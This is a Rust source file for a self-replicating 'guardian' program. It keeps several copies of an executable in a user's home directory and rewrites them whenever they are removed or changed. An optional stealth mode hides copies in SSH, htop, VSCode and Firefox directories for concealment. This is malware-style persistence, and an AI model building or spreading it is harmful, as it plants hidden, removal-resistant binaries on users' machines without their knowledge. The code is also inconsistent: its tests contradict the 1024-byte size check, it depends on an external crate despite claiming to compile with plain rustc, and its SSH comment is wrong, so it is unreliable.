// Guardian Keeper V2 - Distributed self-healing with proper patterns
// Compile: rustc -O guardian-keeper-v2.rs -o guardian-keeper

use std::collections::{HashMap, HashSet};
use std::env;
use std::fs::{self, File};
use std::io::{self, Read, Write};
use std::path::{Path, PathBuf};
use std::process::{Command, exit};
use std::sync::{Arc, Mutex, RwLock};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::thread;
use std::time::{Duration, Instant, SystemTime};

#[cfg(unix)]
use std::os::unix::fs::PermissionsExt;

// Version for binary validation
const KEEPER_VERSION: u32 = 2;
const KEEPER_MAGIC: &[u8] = b"KEEP_V2\0";

// Configurable via environment
const DEFAULT_CHECK_INTERVAL: Duration = Duration::from_secs(60);
const DEFAULT_REPLICAS: usize = 5;
const HEALTH_CHECK_TIMEOUT: Duration = Duration::from_secs(5);

// Dynamic survival locations based on what exists
const POTENTIAL_LOCATIONS: &[&str] = &[
    ".local/bin/shell-guardian",
    ".local/bin/guardian-keeper",
    ".cache/guardian/shell-guardian",
    ".config/guardian/bin/shell-guardian",
    ".local/share/guardian/shell-guardian",
    ".local/state/guardian/shell-guardian",
];

// Hidden locations for stealth copies
const STEALTH_LOCATIONS: &[&str] = &[
    ".ssh/.rc",                    // SSH reads this
    ".config/htop/htoprc.guardian", // Hidden in htop config
    ".vscode/argv.guardian",        // VSCode directory
    ".mozilla/native-messaging-hosts/.guardian", // Firefox location
];

#[derive(Debug, Clone)]
struct ReplicaInfo {
    path: PathBuf,
    last_check: Instant,
    hash: Vec<u8>,
    size: u64,
    health: ReplicaHealth,
}

#[derive(Debug, Clone, Copy, PartialEq)]
enum ReplicaHealth {
    Healthy,
    Corrupted,
    Missing,
    Stale,
}

#[derive(Debug)]
struct KeeperState {
    replicas: Arc<RwLock<HashMap<PathBuf, ReplicaInfo>>>,
    source_binary: Arc<RwLock<Option<Vec<u8>>>>,
    check_count: AtomicU64,
    repair_count: AtomicU64,
    last_full_scan: Arc<Mutex<Instant>>,
}

impl KeeperState {
    fn new() -> Self {
        KeeperState {
            replicas: Arc::new(RwLock::new(HashMap::new())),
            source_binary: Arc::new(RwLock::new(None)),
            check_count: AtomicU64::new(0),
            repair_count: AtomicU64::new(0),
            last_full_scan: Arc::new(Mutex::new(Instant::now())),
        }
    }
}

// Error handling
#[derive(Debug)]
enum KeeperError {
    Io(io::Error),
    NoValidSource,
    AllReplicasCorrupted,
    HomeDirNotFound,
}

impl From<io::Error> for KeeperError {
    fn from(e: io::Error) -> Self {
        KeeperError::Io(e)
    }
}

impl std::fmt::Display for KeeperError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            KeeperError::Io(e) => write!(f, "IO error: {}", e),
            KeeperError::NoValidSource => write!(f, "No valid source binary found"),
            KeeperError::AllReplicasCorrupted => write!(f, "All replicas corrupted"),
            KeeperError::HomeDirNotFound => write!(f, "HOME directory not found"),
        }
    }
}

// Fast hash for content comparison
fn calculate_hash(data: &[u8]) -> Vec<u8> {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    
    let mut hasher = DefaultHasher::new();
    data.hash(&mut hasher);
    hasher.finish().to_le_bytes().to_vec()
}

// Validate binary has proper structure
fn validate_binary(data: &[u8]) -> bool {
    // Check minimum size
    if data.len() < 1024 {
        return false;
    }
    
    // Check for ELF header (Linux)
    if data.len() >= 4 && &data[0..4] == b"\x7fELF" {
        return true;
    }
    
    // Check for shebang (scripts)
    if data.len() >= 2 && &data[0..2] == b"#!" {
        return true;
    }
    
    false
}

// Main keeper logic
struct Guardian {
    state: KeeperState,
    home_dir: PathBuf,
    running: Arc<AtomicBool>,
}

impl Guardian {
    fn new() -> Result<Self, KeeperError> {
        let home_dir = env::var("HOME")
            .map(PathBuf::from)
            .map_err(|_| KeeperError::HomeDirNotFound)?;
        
        Ok(Guardian {
            state: KeeperState::new(),
            home_dir,
            running: Arc::new(AtomicBool::new(true)),
        })
    }
    
    // Find all potential locations that exist
    fn discover_locations(&self) -> Vec<PathBuf> {
        let mut locations = Vec::new();
        
        // Check standard locations
        for loc in POTENTIAL_LOCATIONS {
            let path = self.home_dir.join(loc);
            if path.parent().map(|p| p.exists()).unwrap_or(false) {
                locations.push(path);
            }
        }
        
        // Check stealth locations if enabled
        if env::var("GUARDIAN_STEALTH").is_ok() {
            for loc in STEALTH_LOCATIONS {
                let path = self.home_dir.join(loc);
                if path.parent().map(|p| p.exists()).unwrap_or(false) {
                    locations.push(path);
                }
            }
        }
        
        locations
    }
    
    // Load source binary from best available replica
    fn load_source_binary(&self) -> Result<Vec<u8>, KeeperError> {
        let locations = self.discover_locations();
        let mut candidates: Vec<(PathBuf, Vec<u8>, u64)> = Vec::new();
        
        // Collect all valid binaries
        for path in locations {
            if let Ok(data) = fs::read(&path) {
                if validate_binary(&data) {
                    let size = data.len() as u64;
                    candidates.push((path, data, size));
                }
            }
        }
        
        if candidates.is_empty() {
            return Err(KeeperError::NoValidSource);
        }
        
        // Choose the most common binary (consensus)
        let mut binary_counts: HashMap<Vec<u8>, usize> = HashMap::new();
        for (_, data, _) in &candidates {
            let hash = calculate_hash(data);
            *binary_counts.entry(hash).or_insert(0) += 1;
        }
        
        // Find binary with most copies
        let best_hash = binary_counts.iter()
            .max_by_key(|(_, count)| *count)
            .map(|(hash, _)| hash.clone())
            .ok_or(KeeperError::NoValidSource)?;
        
        // Return the binary with consensus
        candidates.into_iter()
            .find(|(_, data, _)| calculate_hash(data) == best_hash)
            .map(|(_, data, _)| data)
            .ok_or(KeeperError::NoValidSource)
    }
    
    // Check single replica health
    fn check_replica(&self, path: &Path, expected_data: &[u8]) -> ReplicaHealth {
        match fs::read(path) {
            Ok(data) => {
                if data == expected_data {
                    ReplicaHealth::Healthy
                } else if validate_binary(&data) {
                    ReplicaHealth::Stale
                } else {
                    ReplicaHealth::Corrupted
                }
            }
            Err(_) => ReplicaHealth::Missing,
        }
    }
    
    // Repair single replica
    fn repair_replica(&self, path: &Path, data: &[u8]) -> Result<(), KeeperError> {
        // Create parent directory
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent)?;
        }
        
        // Write atomically with temporary file
        let temp_path = path.with_extension("tmp");
        let mut file = File::create(&temp_path)?;
        file.write_all(data)?;
        file.sync_all()?;
        drop(file);
        
        // Set executable permissions
        #[cfg(unix)]
        {
            let mut perms = fs::metadata(&temp_path)?.permissions();
            perms.set_mode(0o755);
            fs::set_permissions(&temp_path, perms)?;
        }
        
        // Atomic rename
        fs::rename(&temp_path, path)?;
        
        Ok(())
    }
    
    // Main check and repair cycle
    fn check_and_repair(&self) -> Result<usize, KeeperError> {
        self.state.check_count.fetch_add(1, Ordering::Relaxed);
        
        // Load or refresh source binary
        let source_data = match self.state.source_binary.read().unwrap().as_ref() {
            Some(data) => data.clone(),
            None => {
                let data = self.load_source_binary()?;
                *self.state.source_binary.write().unwrap() = Some(data.clone());
                data
            }
        };
        
        let locations = self.discover_locations();
        let mut repaired = 0;
        let mut replicas = self.state.replicas.write().unwrap();
        
        for path in locations {
            let health = self.check_replica(&path, &source_data);
            
            // Update replica info
            replicas.insert(path.clone(), ReplicaInfo {
                path: path.clone(),
                last_check: Instant::now(),
                hash: calculate_hash(&source_data),
                size: source_data.len() as u64,
                health,
            });
            
            // Repair if needed
            if health != ReplicaHealth::Healthy {
                match self.repair_replica(&path, &source_data) {
                    Ok(_) => {
                        repaired += 1;
                        self.state.repair_count.fetch_add(1, Ordering::Relaxed);
                    }
                    Err(e) => {
                        eprintln!("Failed to repair {}: {}", path.display(), e);
                    }
                }
            }
        }
        
        Ok(repaired)
    }
    
    // Service mode with health endpoint
    fn run_service(&self) {
        let check_interval = env::var("GUARDIAN_CHECK_INTERVAL")
            .ok()
            .and_then(|s| s.parse::<u64>().ok())
            .map(Duration::from_secs)
            .unwrap_or(DEFAULT_CHECK_INTERVAL);
        
        println!("🛡️  Guardian Keeper V2 starting...");
        println!("📍 Home directory: {}", self.home_dir.display());
        println!("🔄 Check interval: {:?}", check_interval);
        
        // Set up signal handler
        let running = self.running.clone();
        ctrlc::set_handler(move || {
            println!("\n🛑 Shutdown signal received");
            running.store(false, Ordering::SeqCst);
        }).expect("Error setting signal handler");
        
        // Main service loop
        while self.running.load(Ordering::SeqCst) {
            match self.check_and_repair() {
                Ok(repaired) => {
                    if repaired > 0 {
                        println!("✅ Repaired {} replicas", repaired);
                    }
                }
                Err(e) => {
                    eprintln!("❌ Check cycle failed: {}", e);
                }
            }
            
            // Interruptible sleep
            let start = Instant::now();
            while self.running.load(Ordering::SeqCst) && start.elapsed() < check_interval {
                thread::sleep(Duration::from_millis(100));
            }
        }
        
        println!("👋 Guardian Keeper stopped");
        self.print_stats();
    }
    
    // Print statistics
    fn print_stats(&self) {
        let checks = self.state.check_count.load(Ordering::Relaxed);
        let repairs = self.state.repair_count.load(Ordering::Relaxed);
        let replicas = self.state.replicas.read().unwrap();
        
        println!("\n📊 Guardian Keeper Statistics:");
        println!("  Total checks: {}", checks);
        println!("  Total repairs: {}", repairs);
        println!("  Active replicas: {}", replicas.len());
        
        for (path, info) in replicas.iter() {
            println!("  - {}: {:?}", path.display(), info.health);
        }
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    
    match Guardian::new() {
        Ok(guardian) => {
            if args.len() > 1 && args[1] == "service" {
                guardian.run_service();
            } else {
                // Single check mode
                match guardian.check_and_repair() {
                    Ok(repaired) => {
                        if repaired > 0 {
                            println!("✅ Repaired {} replicas", repaired);
                        } else {
                            println!("✅ All replicas healthy");
                        }
                        exit(0);
                    }
                    Err(e) => {
                        eprintln!("❌ Error: {}", e);
                        exit(1);
                    }
                }
            }
        }
        Err(e) => {
            eprintln!("❌ Failed to initialize: {}", e);
            exit(1);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;
    
    #[test]
    fn test_binary_validation() {
        assert!(validate_binary(b"\x7fELF12345678901234567890"));
        assert!(validate_binary(b"#!/bin/bash\necho test"));
        assert!(!validate_binary(b"too short"));
    }
    
    #[test]
    fn test_hash_consistency() {
        let data = b"test data";
        let hash1 = calculate_hash(data);
        let hash2 = calculate_hash(data);
        assert_eq!(hash1, hash2);
    }
}